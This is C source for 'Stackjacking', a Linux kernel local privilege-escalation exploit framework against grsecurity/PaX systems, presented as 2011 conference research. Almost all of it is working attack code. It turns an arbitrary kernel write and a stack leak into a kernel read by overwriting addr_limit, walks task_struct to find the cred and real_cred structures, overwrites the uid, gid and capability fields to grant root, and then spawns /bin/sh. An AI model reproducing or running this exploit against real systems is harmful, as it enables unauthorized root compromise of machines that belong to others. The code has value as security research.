/*
 * Stackjacking:
 * A grsecurity/PaX exploit framework
 *
 * As demonstrated at Hackito Ergo Sum and Immunity INFILTRATE, April 2011
 *
 * Dan Rosenberg (dan.j.rosenberg@gmail.com)
 * Jon Oberheide (jon@oberheide.org)
 *
 * This is a technique that relies on an arbitrary kernel write vulnerability
 * and the leakage of as little as three bytes of uninitialized kernel stack
 * data, typically via copying back of uninitialized structure members.
 *
 * We leverage libkstack, which allows us to use the leak to determine the
 * address of the current process' kernel stack.
 */

#define _GNU_SOURCE

#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <fcntl.h>
#include <limits.h>

#include "kstack.h"

#ifdef __x86_64__
#define USER_DS 0xffff80000000
#define KPTR_MAX 0xffffff0000000000
#else
#define USER_DS 0xc0000000
#define KPTR_MAX 0xff200000
#endif

#define KERNEL_DS ULONG_MAX

/* Globals */
int fd[2];				/* file descriptors for kread */
unsigned long kstack;			/* kernel stack address */

/* Dumb heuristic for if this is possibly a kernel pointer */
int is_kernel_pointer(unsigned long ptr)
{

	if(ptr > USER_DS && ptr < KPTR_MAX && !(ptr % sizeof(long)))
		return 1;

	return 0;
}

/* This is the function that leverages our kernel write and the ability to
 * determine the base address of the current process' kernel stack to build a
 * kernel read primitive.  It does this by taking advantage of the thread_info
 * struct's addr_limit variable.
 *
 * In the mainline kernel, if the addr_limit of a process were to be set to
 * contain KERNEL_DS, all access checks on kernel-to-user copy operations would
 * pass, and you could read kernel memory by simply calling write() with a
 * source address of where you want to read.  However, because PAX_UDEREF
 * implements proper segmentation, we need to make sure the segment registers
 * (specifically the %gs register) contain the appropriate descriptor to allow
 * kernel-to-kernel copying.
 *
 * Fortunately, UDEREF reloads the %gs register based on the contents of
 * addr_limit whenever a thread wakes up from a context switch.  If we could
 * cause a context switch to happen in any kernel function immediately before
 * user-supplied pointers are copied into kernel space in a retrievable
 * location, then we could build an arbitrary read. 
 *
 * It turns out repeatedly calling write() does the trick.  Eventually, write()
 * will be called and the process will be scheduled out before it copies data
 * in.  When it resumes execution, its %gs register will contain __KERNEL_DS
 * and we can do kernel-to-kernel copying, allowing us to copy from a kernel
 * address into a pipe.
 *
 */
unsigned long kread(unsigned long addr, unsigned long size, void * dest) {

	unsigned long addr_limit = kstack + sizeof(void *)*2 + sizeof(int)*4;

	/* Use our kwrite to set addr_limit to KERNEL_DS */
	kernel_write(addr_limit, KERNEL_DS);

	/* Loop until our write happens to be scheduled out
	 * at the right moment, reloading our %gs register.
	 *
	 * Note that this should only loop once on x86-64,
	 * since there's no segmentation. */
	while (write(fd[1], (void *)addr, size) == -1);

	/* Restore USER_DS */
	kernel_write(addr_limit, USER_DS);

	/* Get our data */
	read(fd[0], dest, size);

	return size;

}

/* The function that actually gets us root.  It leverages our arbitrary read
 * and write primitives to find the current process' credentials structure and
 * set its uid and capabilities fields.
 *
 * Assumes a kernel version >= 2.6.29, which introduced a separate cred structure.
 * If your kernel is older than this, modify appropriately. */
int getprivs() {
	
	unsigned long task, cred, cred_ptr, real_cred, real_cred_ptr, val;
	unsigned int i, found_cred = 0, uid = getuid();
	unsigned long * task_struct;

	/* task_struct is always first pointer in thread_info */
	kread(kstack, 4, &task);

	if (!is_kernel_pointer(task)) {
		printf("[*] task_struct pointer (%lx) has a NULL byte. ", task);
		printf("Try again.\n");
		return -1;
	}

	printf("[*] task_struct found at %lx\n", task);

	task_struct = malloc(sizeof(long) * 0x200);

	printf("[*] Reading task_struct...\n");

	kread(task + 0x80, sizeof(long) * 0x200, task_struct);

	/* Walk up task_struct to find the cred struct.
	 * We can't walk backwards from the comm array,
	 * because grsecurity moves the cred and real_cred
	 * structs to weird places inside the task_struct 
	 */
	printf("[*] Finding cred struct (grab a coffee)...\n");
	cred_ptr = task + 0x80;

	for (i = 0; i < 0x200; i++) {

		/* Looking for cred */
		if(!found_cred) {
			cred = task_struct[i];
		
			if (is_kernel_pointer(cred)) {
				kread(cred + sizeof(int), 4, &val);
				if((int)val == (int)uid) {
					kread(cred + sizeof(int)*2, 4, &val);
					if((int)val == (int)uid) {
						found_cred = 1;
						real_cred_ptr = cred_ptr + 4;
						printf("[*] cred struct ptr at %lx\n", cred_ptr);
						printf("[*] cred struct at %lx\n", cred);
						printf("[*] Finding real_cred struct...\n");
						continue;
					}
				}
			}
			cred_ptr += sizeof(long);
		}
		/* Looking for real_cred */
		else {
			real_cred = task_struct[i];

			if (is_kernel_pointer(real_cred)) {
				kread(real_cred + sizeof(int), 4, &val);
				if((int)val == (int)uid) {
					kread(real_cred + sizeof(int)*2, 4, &val);
					if((int)val == (int)uid)
						break;
				}
			}
			real_cred_ptr += sizeof(long);
		}
	}
	
	free(task_struct);

	printf("[*] real_cred struct ptr at %lx\n", real_cred_ptr);
	printf("[*] real_cred struct at %lx\n", real_cred);

	/* modify cred struct in-place */
	/* Assumes no CONFIG_DEBUG_CREDENTIALS */
	kernel_write(cred + 4, 0);     /* uid */
	kernel_write(cred + 8, 0);     /* gid */
	kernel_write(cred + 12, 0);    /* suid */
	kernel_write(cred + 16, 0);    /* sgid */
	kernel_write(cred + 20, 0);    /* euid */
	kernel_write(cred + 24, 0);    /* egid */
	kernel_write(cred + 28, 0);    /* fsuid */
	kernel_write(cred + 32, 0);    /* fsgid */
	kernel_write(cred + 36, 0);    /* securebits */
	kernel_write(cred + 40, UINT_MAX); /* cap_inheritable */
	kernel_write(cred + 44, UINT_MAX);
	kernel_write(cred + 48, UINT_MAX); /* cap_permitted */
	kernel_write(cred + 52, UINT_MAX);
	kernel_write(cred + 56, UINT_MAX); /* cap_effective */
	kernel_write(cred + 60, UINT_MAX);

	kernel_write(real_cred + 4, 0);     /* uid */
	kernel_write(real_cred + 8, 0);     /* gid */
	kernel_write(real_cred + 12, 0);    /* suid */
	kernel_write(real_cred + 16, 0);    /* sgid */
	kernel_write(real_cred + 20, 0);    /* euid */
	kernel_write(real_cred + 24, 0);    /* egid */
	kernel_write(real_cred + 28, 0);    /* fsuid */
	kernel_write(real_cred + 32, 0);    /* fsgid */
	kernel_write(real_cred + 36, 0);    /* securebits */
	kernel_write(real_cred + 40, UINT_MAX); /* cap_inheritable */
	kernel_write(real_cred + 44, UINT_MAX);
	kernel_write(real_cred + 48, UINT_MAX); /* cap_permitted */
	kernel_write(real_cred + 52, UINT_MAX);
	kernel_write(real_cred + 56, UINT_MAX); /* cap_effective */
	kernel_write(real_cred + 60, UINT_MAX);

	if(getuid()) {
		printf("[*] Exploit failed to get root.\n");
		return -1;
	}
	
	printf("[*] Overwrote creds in place\n");
	return 0;

}

int main(int argc, char * argv[])
{

	int ret;

	/* For our kread */
	ret = pipe(fd);

	if(ret < 0) {
		printf("[*] Failed to open pipe.\n");
		return -1;
	}

	/* Setup for our leak */
	ret = setup();

	if(ret < 0) {
		printf("[*] Setup for kstack leak failed.\n");
		return -1;
	}

	/* Get our kernel stack base address using libkstack */
	kstack = get_kstack();
	printf("[*] Kernel stack found at: %lx\n", kstack);

	/* Increase niceness to improve likelihood of being
	 * scheduled out during kernel read */
	nice(20);

	/* Get root */
	ret = getprivs();

	if (!ret) {	
		execl("/bin/sh", "/bin/sh", NULL);

		/* Shouldn't reach this... */
		printf("[*] Failed to spawn shell\n");
	}

	return 1;
}
